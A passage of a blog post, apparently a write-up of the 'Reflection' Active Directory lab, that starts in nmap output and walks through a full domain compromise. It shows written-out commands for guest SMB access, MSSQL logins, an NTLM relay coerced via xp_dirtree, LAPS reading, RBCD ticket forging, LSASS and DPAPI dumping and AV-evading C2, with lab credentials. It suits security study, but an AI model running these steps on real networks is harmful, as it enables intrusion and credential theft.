</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>after</span><span class=p>:</span><span class=w>  </span><span class=mi>2025</span><span class=o>-</span><span class=mi>05</span><span class=o>-</span><span class=mi>06</span><span class=n>T08</span><span class=p>:</span><span class=mi>43</span><span class=p>:</span><span class=mi>03</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>rdp</span><span class=o>-</span><span class=n>ntlm</span><span class=o>-</span><span class=n>info</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>Target_Name</span><span class=p>:</span><span class=w> </span><span class=n>REFLECTION</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>NetBIOS_Domain_Name</span><span class=p>:</span><span class=w> </span><span class=n>REFLECTION</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>NetBIOS_Computer_Name</span><span class=p>:</span><span class=w> </span><span class=n>WS01</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>DNS_Domain_Name</span><span class=p>:</span><span class=w> </span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>DNS_Computer_Name</span><span class=p>:</span><span class=w> </span><span class=n>ws01</span><span class=p>.</span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>DNS_Tree_Name</span><span class=p>:</span><span class=w> </span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>Product_Version</span><span class=p>:</span><span class=w> </span><span class=mi>10</span><span class=p>.</span><span class=mi>0</span><span class=p>.</span><span class=mi>19041</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>  </span><span class=n>System_Time</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=n>T08</span><span class=p>:</span><span class=mi>48</span><span class=p>:</span><span class=mi>25</span><span class=o>+</span><span class=mi>00</span><span class=p>:</span><span class=mi>00</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Service</span><span class=w> </span><span class=n>Info</span><span class=p>:</span><span class=w> </span><span class=n>OS</span><span class=p>:</span><span class=w> </span><span class=n>Windows</span><span class=p>;</span><span class=w> </span><span class=n>CPE</span><span class=p>:</span><span class=w> </span><span class=n>cpe</span><span class=p>:</span><span class=o>/</span><span class=n>o</span><span class=p>:</span><span class=n>microsoft</span><span class=p>:</span><span class=n>windows</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>Host</span><span class=w> </span><span class=n>script</span><span class=w> </span><span class=n>results</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>smb2</span><span class=o>-</span><span class=k>security</span><span class=o>-</span><span class=k>mode</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=mi>3</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>    </span><span class=n>Message</span><span class=w> </span><span class=n>signing</span><span class=w> </span><span class=n>enabled</span><span class=w> </span><span class=n>but</span><span class=w> </span><span class=k>not</span><span class=w> </span><span class=n>required</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>smb2</span><span class=o>-</span><span class=n>time</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=nb>date</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=n>T08</span><span class=p>:</span><span class=mi>48</span><span class=p>:</span><span class=mi>36</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>  </span><span class=n>start_date</span><span class=p>:</span><span class=w> </span><span class=n>N</span><span class=o>/</span><span class=n>A</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_clock</span><span class=o>-</span><span class=n>skew</span><span class=p>:</span><span class=w> </span><span class=n>mean</span><span class=p>:</span><span class=w> </span><span class=o>-</span><span class=mi>1</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=n>deviation</span><span class=p>:</span><span class=w> </span><span class=mi>0</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=n>median</span><span class=p>:</span><span class=w> </span><span class=o>-</span><span class=mi>1</span><span class=n>s</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Post</span><span class=o>-</span><span class=n>scan</span><span class=w> </span><span class=n>script</span><span class=w> </span><span class=n>results</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>clock</span><span class=o>-</span><span class=n>skew</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=o>-</span><span class=mi>1</span><span class=n>s</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>     </span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>228</span><span class=p>.</span><span class=mi>197</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>    </span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>228</span><span class=p>.</span><span class=mi>199</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Service</span><span class=w> </span><span class=n>detection</span><span class=w> </span><span class=n>performed</span><span class=p>.</span><span class=w> </span><span class=n>Please</span><span class=w> </span><span class=n>report</span><span class=w> </span><span class=k>any</span><span class=w> </span><span class=n>incorrect</span><span class=w> </span><span class=n>results</span><span class=w> </span><span class=k>at</span><span class=w> </span><span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>nmap</span><span class=p>.</span><span class=n>org</span><span class=o>/</span><span class=n>submit</span><span class=o>/</span><span class=w> </span><span class=p>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Nmap</span><span class=w> </span><span class=n>done</span><span class=p>:</span><span class=w> </span><span class=mi>3</span><span class=w> </span><span class=n>IP</span><span class=w> </span><span class=n>addresses</span><span class=w> </span><span class=p>(</span><span class=mi>3</span><span class=w> </span><span class=n>hosts</span><span class=w> </span><span class=n>up</span><span class=p>)</span><span class=w> </span><span class=n>scanned</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=mi>73</span><span class=p>.</span><span class=mi>12</span><span class=w> </span><span class=n>seconds</span><span class=w>
</span></span></span></code></pre></div><p>The good option is saving all FQDN names of the machines to /etc/hosts file. So, mine looks like that.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>228</span><span class=p>.</span><span class=mi>197</span><span class=w>   </span><span class=n>dc01</span><span class=p>.</span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w> </span><span class=n>dc01</span><span class=w> </span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>228</span><span class=p>.</span><span class=mi>198</span><span class=w>   </span><span class=n>ms01</span><span class=p>.</span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w> </span><span class=n>ms01</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>228</span><span class=p>.</span><span class=mi>199</span><span class=w>   </span><span class=n>ws02</span><span class=p>.</span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w> </span><span class=n>ws01</span><span class=w>
</span></span></span></code></pre></div><p><br>Let&rsquo;s enumerate smb shares first of all. As we can see in all machines SMB is exist. So probably good idea starting from the SMB shares.</p><p>For the first enum <strong>netexec</strong> the best option.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>netexec</span> <span class=n>smb</span> <span class=mf>10.10.228.197</span><span class=o>-</span><span class=mi>199</span> <span class=o>-</span><span class=n>u</span> <span class=err>&#39;&#39;</span> <span class=o>-</span><span class=n>p</span> <span class=err>&#39;&#39;</span> <span class=o>--</span><span class=n>shares</span>
</span></span></code></pre></div><p><img loading=lazy src=image-1.png alt></p><p><br>As you can see the null signing does not work, but we have a user <strong>guest</strong> and if we are lucky enough the guest can enumerate shares without password.</p><p>Also keep in mind that in <strong>all</strong> machines even in DC <strong>SMB signing</strong> does not exist. Maybe there is possible NTLM Relays.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>netexec</span> <span class=n>smb</span> <span class=mf>10.10.228.197</span><span class=o>-</span><span class=mi>199</span> <span class=o>-</span><span class=n>u</span> <span class=err>&#39;</span><span class=n>guest</span><span class=err>&#39;</span> <span class=o>-</span><span class=n>p</span> <span class=err>&#39;&#39;</span> <span class=o>--</span><span class=n>shares</span>
</span></span></code></pre></div><p><img loading=lazy src=image-2.png alt></p><p><br>We are lucky enough to enumerate shares on MS01 machine using quest user. There are some shares readable for us. The unique one is staging share. Let&rsquo;s start from that share.</p><p><br>Using <strong>impacket-smbclient</strong> we can perform enumeration.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>impacket</span><span class=o>-</span><span class=n>smbclient</span><span class=w> </span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=o>/</span><span class=n>guest</span><span class=o>@</span><span class=n>ms01</span><span class=w> </span><span class=o>-</span><span class=k>no</span><span class=o>-</span><span class=n>pass</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-3.png alt></p><p><br>Interseting, in that share we found staging_db.conf file and it contains credential of user web_staging and it seems for Database.</p><p>On MS01 machine we have MSSQL. So, probably this cred for the MSSQL instance.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>impacket</span><span class=o>-</span><span class=n>mssqlclient</span><span class=w> </span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=o>/</span><span class=n>web_staging</span><span class=p>:</span><span class=n>Washroom510</span><span class=o>@</span><span class=n>ms01</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-4.png alt></p><p><br>As you can see we logged in to mssql, now it is time to enumerate more!</p><p>Actually we can use the help command and get some interesting, comfortable commands, which can help perform enumeration</p><p><img loading=lazy src=image-5.png alt></p><p><br>First off the most interesting thing on mssql in my opinion is <strong>xp_cmdshell</strong>, which will execute the cmd commands and return output of the command.</p><p><img loading=lazy src=image-6.png alt></p><p><br>But we do not have permissions to execute xp_cmdshell. The good options is checking the databases and tables, respectively.
<img loading=lazy src=image-7.png alt></p><p><br>Interesting enough, we have database staging, which is not the default db in mssql. Let&rsquo;s enumerate that one.</p><p><img loading=lazy src=image-8.png alt></p><p><br>We found some creds too, but it is not looks like domain users, so let&rsquo;s enumerate more.</p><p>Remember that in <strong>every machine</strong> SMB signing is turned off. So, we can perform NTLM Relay attacks. For that attack the <strong>xp_dirtree</strong> is awesome options, because we can use the UNC Path to our machine and got NTLM hash of the user, and perform relay through <strong>impacket-ntlmrelayx</strong> tool.</p><p><img loading=lazy src=image-9.png alt></p><p><img loading=lazy src=image-10.png alt></p><p>As you can see we got NTLMv2 hash of svc_web_staging user. Not let&rsquo;s try to relay it to DC.</p><h3 id=note-that-ip-addresses-of-machines-are-changed>Note that IP addresses of machines are changed<a hidden class=anchor aria-hidden=true href=#note-that-ip-addresses-of-machines-are-changed>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>impacket</span><span class=o>-</span><span class=n>ntlmrelayx</span><span class=w> </span><span class=o>-</span><span class=n>smb2support</span><span class=w> </span><span class=o>-</span><span class=n>socks</span><span class=w> </span><span class=o>-</span><span class=n>socks</span><span class=o>-</span><span class=n>port</span><span class=w> </span><span class=mi>1080</span><span class=w> </span><span class=o>-</span><span class=n>t</span><span class=w> </span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>214</span><span class=p>.</span><span class=mi>101</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-11.png alt></p><p><br>We started the impacket-ntlmrelay and we need to wait the connection to our machine. As the target we can choose the DC01.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>exec</span><span class=w> </span><span class=n>xp_dirtree</span><span class=w> </span><span class=s1>&#39;\\10.8.0.238\something&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-12.png alt></p><p>As you can see we perform relay attack and the authenticating against DC01 is succeed.</p><p>Also the socks proxy is ready on port 1080.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>proxychains</span><span class=w> </span><span class=o>-</span><span class=n>q</span><span class=w> </span><span class=n>smbclient</span><span class=w> </span><span class=o>-</span><span class=n>U</span><span class=w> </span><span class=n>reflection</span><span class=o>/</span><span class=n>svc_web_staging</span><span class=w> </span><span class=o>-</span><span class=n>L</span><span class=w> </span><span class=err>\\\\</span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>214</span><span class=p>.</span><span class=mi>101</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-13.png alt></p><p><br>As you can see we can perform enumeration of shares in DC01 machine. There is also one unique share, whish is staging. Let&rsquo;s enumerate that share deeper.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>proxychains</span><span class=w> </span><span class=o>-</span><span class=n>q</span><span class=w> </span><span class=n>impacket</span><span class=o>-</span><span class=n>smbclient</span><span class=w> </span><span class=n>reflection</span><span class=o>/</span><span class=n>svc_web_staging</span><span class=o>@</span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>214</span><span class=p>.</span><span class=mi>101</span><span class=w> </span><span class=o>-</span><span class=k>no</span><span class=o>-</span><span class=n>pass</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-14.png alt></p><p><br>Awesome, we have a password for user web_prod. In my opinion this creds for mssql instance on DC01 machine. Let&rsquo;s try this out.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>impacket</span><span class=o>-</span><span class=n>mssqlclient</span><span class=w> </span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=o>/</span><span class=n>web_prod</span><span class=p>:</span><span class=n>Tribesman201</span><span class=o>@</span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>214</span><span class=p>.</span><span class=mi>101</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-15.png alt></p><p><br>We successfully logged in to MSSQL instance on DC01 and let&rsquo;s enumerate databases;</p><p><img loading=lazy src=image-16.png alt></p><p><br>Finally we found some domain users. Now let&rsquo;s collect the bloodhound information and enumerate AD ACLs.</p><p>The interestint moment about which version of bloodhound is more steltheir. I have tested on some environments, where AV and EDR exist and the netexec version is more stelthier than bloodhound.py. So, in this moment we will use the netexec&rsquo;s bloodhound.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>netexec</span> <span class=n>ldap</span> <span class=mf>10.10.214.101</span> <span class=o>-</span><span class=n>u</span> <span class=n>abbie</span><span class=p>.</span><span class=n>smith</span> <span class=o>-</span><span class=n>p</span> <span class=err>&#39;</span><span class=n>CMe1x</span><span class=o>+</span><span class=n>nlRaaWEw</span><span class=err>&#39;</span> <span class=o>--</span><span class=n>bloodhound</span> <span class=o>-</span><span class=n>c</span> <span class=n>All</span> <span class=o>--</span><span class=n>dns</span><span class=o>-</span><span class=n>tcp</span> <span class=o>--</span><span class=n>dns</span><span class=o>-</span><span class=n>server</span> <span class=mf>10.10.214.101</span>
</span></span></code></pre></div><p><img loading=lazy src=image-17.png alt></p><p><br>As you can see the data saved in .zip format. Let&rsquo;s start the neo4j and upload an archive.</p><p><img loading=lazy src=image-18.png alt></p><p><br>While enumeration on bloodhound we can find that abbie.smith has ACL GenericAll over MS01 machine. What does it mean? It means that we have all access rights over that object. So we can perform RBCD (Resource Based Constrained Delegation), or make ShadowCredential attack. For the RBCD MachineAccountQuota is 0 which means we can not creat a computer account.</p><p><img loading=lazy src=image-20.png alt></p><p><br>There is exist LAPS policy. GenericAll also gives access to read LAPS password. Let&rsquo;s try to perform this attack.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>python3</span> <span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>pyLAPS</span><span class=o>/</span><span class=n>pyLAPS</span><span class=p>.</span><span class=n>py</span> <span class=o>-</span><span class=n>u</span> <span class=n>abbie</span><span class=p>.</span><span class=n>smith</span> <span class=o>-</span><span class=n>p</span> <span class=err>&#39;</span><span class=n>CMe1x</span><span class=o>+</span><span class=n>nlRaaWEw</span><span class=err>&#39;</span> <span class=o>-</span><span class=n>d</span> <span class=n>reflection</span><span class=p>.</span><span class=n>vl</span> <span class=o>--</span><span class=n>dc</span><span class=o>-</span><span class=n>ip</span> <span class=mf>10.10.214.101</span>
</span></span></code></pre></div><p><img loading=lazy src=image-19.png alt></p><p><br>So we successfully got password of local Administrator user in MS01 machine. Now we can use evil-winrm or psexec and try to dump the LSASS process.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>evil</span><span class=o>-</span><span class=n>winrm</span><span class=w> </span><span class=o>-</span><span class=n>i</span><span class=w> </span><span class=n>ms01</span><span class=w> </span><span class=o>-</span><span class=n>u</span><span class=w> </span><span class=n>Administrator</span><span class=w> </span><span class=o>-</span><span class=n>p</span><span class=w> </span><span class=s1>&#39;H447.++h6g5}xi&#39;</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-21.png alt></p><p><br>Great! now we can upload mimikatz, but for sure mimikatz will be blocked by AV or even more EDR solutions. So, we need to execute mimikatz in memory and use such kind of techniques. So, let&rsquo;s get a C2 session. In this example I will use metasploit and will generate payload using msfvenom. Using a shellcode loader I will get a beacon session.</p><p><img loading=lazy src=image-22.png alt></p><p><br>But after dumping lsass process we did not find anything interesting and we finally recall about DPAPI. Using the option of netexec we got creds for another user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>netexec</span> <span class=n>smb</span> <span class=n>ms01</span> <span class=o>-</span><span class=n>u</span> <span class=n>Administrator</span> <span class=o>-</span><span class=n>p</span> <span class=err>&#39;</span><span class=n>H447</span><span class=p>.</span><span class=o>++</span><span class=n>h6g5</span><span class=p>}</span><span class=n>xi</span><span class=err>&#39;</span> <span class=o>--</span><span class=n>local</span><span class=o>-</span><span class=n>auth</span> <span class=o>--</span><span class=n>dpapi</span>
</span></span></code></pre></div><p><img loading=lazy src=image-23.png alt></p><p><br>We got creds of Georgia.Price user. Let&rsquo;s enumerate more.
<img loading=lazy src=image-24.png alt></p><p><br>So this user has GenericAll over WS01 machine. In that machies LAPS does not exist, so what can we do? Of course RBCD. Remember that MS01 pwned and we can use that machine for RBCD.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>impacket</span><span class=o>-</span><span class=n>rbcd</span> <span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=o>/</span><span class=n>georgia</span><span class=p>.</span><span class=nl>price</span><span class=p>:</span><span class=err>&#39;</span><span class=n>DBl</span><span class=o>+</span><span class=mi>5</span><span class=n>MPkpJg5id</span><span class=err>&#39;</span> <span class=o>-</span><span class=n>dc</span><span class=o>-</span><span class=n>ip</span> <span class=mf>10.10.214.101</span> <span class=o>-</span><span class=n>delegate</span><span class=o>-</span><span class=n>from</span> <span class=n>MS01</span><span class=err>$</span> <span class=o>-</span><span class=n>delegate</span><span class=o>-</span><span class=n>to</span> <span class=n>WS01</span><span class=err>$</span> <span class=o>-</span><span class=n>action</span> <span class=n>write</span>
</span></span></code></pre></div><p><img loading=lazy src=image-25.png alt></p><p><br>RBCD successfully completed now it is time to get Services Ticket as domain Administator and compromise the WS01 machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>impacket</span><span class=o>-</span><span class=n>getST</span> <span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=o>/</span><span class=err>&#39;</span><span class=n>MS01</span><span class=err>$&#39;</span> <span class=o>-</span><span class=n>dc</span><span class=o>-</span><span class=n>ip</span> <span class=n>dc01</span><span class=p>.</span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span> <span class=o>-</span><span class=n>aesKey</span> <span class=mi>64</span><span class=n>cfd5762890faa03300f588488cff43e080f49be43e410c8c62d7acb502a5a1</span> <span class=o>-</span><span class=n>spn</span> <span class=err>&#39;</span><span class=n>cifs</span><span class=o>/</span><span class=n>ws01</span><span class=p>.</span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=err>&#39;</span> <span class=o>-</span><span class=n>impersonate</span> <span class=n>Administrator</span>
</span></span></code></pre></div><p><img loading=lazy src=image-26.png alt></p><p><br>Awesome the ticket is saved and now we can without any issues perform memory dumping one more time.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>export</span> <span class=n>KRB5CCNAME</span><span class=o>=</span><span class=n>Administrator</span><span class=err>@</span><span class=n>cifs_ws01</span><span class=p>.</span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=err>@</span><span class=n>REFLECTION</span><span class=p>.</span><span class=n>VL</span><span class=p>.</span><span class=n>ccache</span>
</span></span><span class=line><span class=cl><span class=n>netexec</span> <span class=n>smb</span> <span class=n>ws01</span> <span class=o>-</span><span class=n>u</span> <span class=n>Administrator</span> <span class=o>-</span><span class=n>k</span> <span class=o>--</span><span class=n>use</span><span class=o>-</span><span class=n>kcache</span> <span class=o>--</span><span class=n>lsa</span>
</span></span></code></pre></div><p><img loading=lazy src=image-27.png alt></p><p><br>We got another user which is Rhys.Garner, but after some enum this user does not has any critical ACLs over objects, BUT there is another interesting thing&mldr;</p><p><img loading=lazy src=image-28.png alt></p><p><br>While searching garner we can another user who is dom_rgarner and he is a member of Domain Administrators group. So, if we lucky enough, Rhys.Garner uses the same password to that account.</p><p><img loading=lazy src=image-29.png alt></p><p><br>Awesome! Now we have full control over all the domain.</p></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=http://localhost:1313/>Shelldon's blog</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>